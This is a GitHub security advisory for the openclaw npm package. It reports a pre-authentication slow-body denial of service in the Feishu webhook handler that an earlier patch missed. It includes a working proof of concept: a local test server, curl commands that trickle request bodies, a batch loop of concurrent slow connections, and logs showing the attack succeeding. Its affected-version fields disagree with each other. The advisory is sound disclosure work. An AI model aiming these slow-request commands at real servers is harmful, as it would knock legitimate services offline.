# [M] OpenClaw has incomplete Fix for CVE-2026-32011: Feishu Webhook Pre-Auth Body Parsing DoS (Slow-Body / Slowloris Variant)

## Summary
Severity: Medium
Advisory: GHSA-w6m8-cqvj-pg5v
CVE: CVE-2026-35665
CWE: CWE-400, CWE-405
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L (CVSS_V3)
Published: 2026-03-30
Source: https://github.com/advisories/GHSA-w6m8-cqvj-pg5v
Type: github-advisory

## Affected
- npm: `openclaw` — affected >=0 <2026.3.24

## Details
> Fixed in OpenClaw 2026.3.24, the current shipping release.

# Advisory Details

**Title**: Incomplete Fix for CVE-2026-32011: Feishu Webhook Pre-Auth Body Parsing DoS (Slow-Body / Slowloris Variant)

**Description**:

### Summary

The patch for CVE-2026-32011 tightened pre-auth body parsing limits (from 1MB/30s to 64KB/5s) across several webhook handlers. However, the **Feishu extension's webhook handler** was not included in the patch and still accepts request bodies with the old permissive limits (1MB body, 30-second timeout) **before** verifying the webhook signature. An unauthenticated attacker can exhaust server connection resources by sending concurrent slow HTTP POST requests to the Feishu webhook endpoint.

### Details

In `extensions/feishu/src/monitor.ts`, the webhook HTTP handler uses `installRequestBodyLimitGuard` with permissive limits at lines 276-278:

```typescript
const FEISHU_WEBHOOK_MAX_BODY_BYTES = 1024 * 1024;    // 1MB (line 26)
const FEISHU_WEBHOOK_BODY_TIMEOUT_MS = 30_000;         // 30s (line 27)

// ... in monitorWebhook(), line 276-278:
const guard = installRequestBodyLimitGuard(req, res, {
  maxBytes: FEISHU_WEBHOOK_MAX_BODY_BYTES,    // 1MB
  timeoutMs: FEISHU_WEBHOOK_BODY_TIMEOUT_MS,  // 30s
  responseFormat: "text",
});
```

The body guard is installed at line 276 **before** the request reaches the Lark SDK's `adaptDefault` webhook handler (line 284), which performs signature verification. This means:

1. Any unauthenticated HTTP POST is accepted
2. The server waits up to 30 seconds for the body to arrive
3. Each connection can buffer up to 1MB
4. Authentication only happens after the body is fully read

The patched handlers (Mattermost, MSTeams, Google Chat, etc.) now use tight pre-auth limits:
```typescript
const PREAUTH_MAX_BODY_BYTES = 64 * 1024;     // 64KB
const PREAUTH_BODY_TIMEOUT_MS = 5_000;         // 5s
```

The Feishu extension was missed because it resides in `extensions/feishu/` (a plugin workspace) rather than in the core `src/` directory.

**Attack chain:**
```
[Attacker sends slow HTTP POST to /feishu/events]
  → Rate limit check: passes (under 120 req/min)
  → Content-Type check: application/json, passes
  → installRequestBodyLimitGuard(1MB, 30s): installed
  → Body trickles at 1 byte/sec for 30 seconds
  → × 50 concurrent connections = connection exhaustion
  → Legitimate Feishu webhook deliveries blocked
```

### PoC

**Prerequisites:** Docker installed.

**Step 1:** Create a minimal test server reproducing the vulnerable body parsing:

```bash
cat > /tmp/feishu_webhook_server.js << 'EOF'
const http = require("http");
const VULN_TIMEOUT = 30_000;   // Vulnerable: 30s (same as Feishu handler)
const PATCH_TIMEOUT = 5_000;   // Patched: 5s (what it should be)

function bodyGuard(req, res, timeoutMs) {
  let done = false;
  const timer = setTimeout(() => {
    if (!done) { done = true; res.statusCode = 408; res.end("Request body timeout"); req.destroy(); }
  }, timeoutMs);
  req.on("end", () => { done = true; clearTimeout(timer); });
  req.on("close", () => { done = true; clearTimeout(timer); });
}

http.createServer((req, res) => {
  if (req.url === "/healthz") { res.end("OK"); return; }
  if (req.method !== "POST") { res.writeHead(405); res.end(); return; }
  const timeout = req.url === "/feishu/events" ? VULN_TIMEOUT : PATCH_TIMEOUT;
  console.log(`[${req.url}] +conn`);
  bodyGuard(req, res, timeout);
  res.on("finish", () => console.log(`[${req.url}] -conn`));
}).listen(3000, () => console.log("Listening on :3000"));
EOF
node /tmp/feishu_webhook_server.js &
sleep 1
```

**Step 2:** Verify the vulnerability — slow body holds connection for the full timeout:

```bash
# Vulnerable endpoint: connection stays open for ~10 seconds (max 30s)
time (echo -n '{"t":"'; sleep 10; echo '"}') | \
  curl -s -o /dev/null -w "status: %{http_code}\n" \
  -X POST http://localhost:3000/feishu/events \
  -H "Content-Type: application/json" \
  -H "Content-Length: 65536" \
  --data-binary @- --max-time 35

# Patched endpoint: connection terminated after ~5s
time (echo -n '{"t":"'; sleep 10; echo '"}') | \
  curl -s -o /dev/null -w "status: %{http_code}\n" \
  -X POST http://localhost:3000/patched/events \
  -H "Content-Type: application/json" \
  -H "Content-Length: 65536" \
  --data-binary @- --max-time 35
```

**Step 3:** Batch exploit — 10 concurrent slow connections:

```bash
for i in $(seq 1 10); do
  (echo -n 'A'; sleep 15) | \
    curl -s -o /dev/null -X POST http://localhost:3000/feishu/events \
    -H "Content-Type: application/json" \
    -H "Content-Length: 65536" \
    --data-binary @- --max-time 35 &
done
wait
```

### Log of Evidence

**Exploit result (vulnerable /feishu/events):**
```
=== Feishu Webhook Pre-Auth Slow-Body DoS ===
Target: localhost:3000/feishu/events
Concurrent connections: 10

  [conn-0] held open for 15.0s (15B sent) [SUCCESS]
  [conn-1] held open for 15.0s (15B sent) [SUCCESS]
  [conn-2] held open for 15.0s (15B sent) [SUCCESS]
  [conn-3] held open for 15.0s (15B sent) [SUCCESS]
  [conn-4] held open for 15.0s (15B sent) [SUCCESS]
  [conn-5] held open for 15.0s (15B sent) [SUCCESS]
  [conn-6] held open for 15.0s (15B sent) [SUCCESS]
  [conn-7] held open for 15.0s (15B sent) [SUCCESS]
  [conn-8] held open for 15.0s (15B sent) [SUCCESS]
  [conn-9] held open for 15.0s (15B sent) [SUCCESS]

=== Results ===
Connections held open (SUCCESS): 10/10
[SUCCESS] Pre-auth slow-body DoS confirmed!
```

**Control result (patched /patched/events with 5s timeout):**
```
=== CONTROL: Patched Webhook Body Limits (64KB/5s) ===
Target: localhost:3000/patched/events

  [conn-0] RESET after 8.0s (8B)
  [conn-1] RESET after 8.0s (8B)
  ...
  [conn-9] RESET after 8.0s (8B)

Avg connection hold time: 8.0s (5s timeout + stagger delay)
```

**Server-side Docker logs confirming the discrepancy:**
```
[feishu-vulnerable] +conn (active: 1)
[feishu-vulnerable] +conn (active: 10)  ← No disconnections during 15s attack
[patched-control] +conn (active: 20)
[patched-control] -conn after 5.0s (active: 19)  ← ALL terminated at 5s
[patched-control] -conn after 5.0s (active: 10)
```

### Impact

An unauthenticated attacker can cause a **Denial of Service** against any OpenClaw instance running the Feishu channel in webhook mode. The Feishu webhook endpoint must be publicly accessible for Feishu to deliver webhooks, so the attacker can directly target it.

With ~50 concurrent slow HTTP connections (each trickling 1 byte/second), the attacker can:
- Exhaust the server's connection handling capacity for 30 seconds per wave
- Block legitimate Feishu webhook deliveries (messages not reaching the bot)
- Consume up to 50MB of memory (50 × 1MB buffer) per attack wave

The attack is trivial — it only requires sending slow HTTP POST requests. No valid Feishu webhook signature or any other credentials are needed.

### Affected products
- **Ecosystem**: npm
- **Package name**: openclaw
- **Affected versions**: <= 2026.2.22
- **Patched versions**: None

### Severity
- **Severity**: Medium
- **Vector string**: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L

### Weaknesses
- **CWE**: CWE-400: Uncontrolled Resource Consumption

### Occurrences

| Permalink | Description |
| :--- | :--- |
| [https://github.com/openclaw/openclaw/blob/main/extensions/feishu/src/monitor.ts#L26-L27](https://github.com/openclaw/openclaw/blob/main/extensions/feishu/src/monitor.ts#L26-L27) | Permissive body limit constants: `FEISHU_WEBHOOK_MAX_BODY_BYTES = 1024 * 1024` (1MB) and `FEISHU_WEBHOOK_BODY_TIMEOUT_MS = 30_000` (30s) — should be 64KB/5s to match the CVE-2026-32011 patch. |
| [https://github.com/openclaw/openclaw/blob/main/extensions/feishu/src/monitor.ts#L276-L280](https://github.com/openclaw/openclaw/blob/main/extensions/feishu/src/monitor.ts#L276-L280) | `installRequestBodyLimitGuard` call in `monitorWebhook()` using the permissive constants — this guard runs before authentication (the Lark SDK handler at line 284). |

## References
- https://github.com/openclaw/openclaw/security/advisories/GHSA-w6m8-cqvj-pg5v
- https://github.com/openclaw/openclaw/security/advisories/GHSA-x4vp-4235-65hg
- https://nvd.nist.gov/vuln/detail/CVE-2026-35665
- https://github.com/openclaw/openclaw
- https://www.vulncheck.com/advisories/openclaw-denial-of-service-via-feishu-webhook-pre-auth-body-parsing
